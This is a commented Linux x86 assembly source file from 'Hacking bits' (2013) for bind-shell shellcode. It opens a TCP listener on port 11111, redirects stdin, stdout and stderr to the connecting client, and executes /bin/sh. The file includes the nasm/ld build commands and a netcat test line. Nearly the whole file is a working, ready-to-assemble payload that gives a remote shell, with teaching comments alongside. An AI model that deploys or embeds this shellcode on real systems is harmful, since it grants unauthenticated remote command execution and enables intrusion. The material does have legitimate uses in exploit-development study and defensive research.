; Shell Bind TCP - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   shell_bind_tcp
;
;   * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)
;
;
;   # nasm -f elf32 shell_bind_tcp.asm -o shell_bind_tcp.o -g
;   # ld -m elf_i386 shell_bind_tcp.o -o shell_bind_tcp
;   # ./shell_bind_tcp
;
;   Testing
;   # nc 127.0.0.1 11111


global _start

section .text

_start:

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 1		; socketcall type (sys_socket 1)

	; socket arguments (bits/socket.h, netinet/in.h)
	push 0			; IPPROTO_IP = 0 (int)
	push 1			; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption

	mov edx, eax		; saving the returned socket file descriptor


	; Avoiding SIGSEGV when trying to reconnect before the kernel to close the socket previously opened
	; this problem happens in most shellcodes, even in the Metasploit, because they do not care
	; about the reuse of the socket address
	; int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
	; setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t)

        mov eax, 102		; syscall 102 - socketcall
        mov ebx, 14		; socketcall type (sys_setsockopt 14)

        push 4                  ; sizeof socklen_t
        push esp                ; address of socklen_t - on the stack
        push 2                  ; SO_REUSEADDR = 2
        push 1                  ; SOL_SOCKET = 1
        push edx                ; sockfd

        mov ecx, esp		; ptr to argument array

        int 0x80		; kernel interrupt


	; Biding the socket with an address type
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; bind(sockfd, [AF_INET, 11111, INADDR_ANY], 16)

	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 2		; socketcall type (sys_bind 2)

	; building the sockaddr_in struct (sys/socket.h, netinet/in.h and bits/sockaddr.h)
	push 0			; INADDR_ANY = 0 (uint32_t)
	push WORD 0x672b	; port in byte reverse order = 11111 (uint16_t)
	push WORD 2		; AF_INET = 2 (unsigned short int)
	mov ecx, esp		; struct pointer

	; bind arguments (sys/socket.h)
	push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
	push edx		; socket fd (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interrruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, 0);

	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 4		; socketcall type (sys_listen 4)

	; listen arguments
	push 0			; backlog (connections queue size)
	push edx		; socket fd

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

        mov eax, 102            ; syscall 102 - socketcall
        mov ebx, 5              ; socketcall type (sys_accept 5)

	; accept arguments
	push 0			; NULL - we don't need to know anything about the client
	push 0			; NULL - we don't need to know anything about the client
	push edx		; socket fd

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption

	mov edx, eax		; saving the returned socket fd (client)


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	mov eax, 63		; syscall 63 - dup2
	mov ebx, edx		; oldfd (client socket fd)
	mov ecx, 0		; stdin file descriptor

	int 0x80		; kernel interruption

        mov eax, 63
        mov ecx, 1		; stdout file descriptor

        int 0x80

        mov eax, 63
        mov ecx, 2		; stderr file descriptor

        int 0x80


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	mov eax, 11		; execve syscall

	; execve string argument
	push 0			; null byte
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"

	mov ebx, esp		; ptr to "/bin//sh" string
	mov ecx, 0		; null ptr to argv
	mov edx, 0		; null ptr to envp

	int 0x80		; bingo
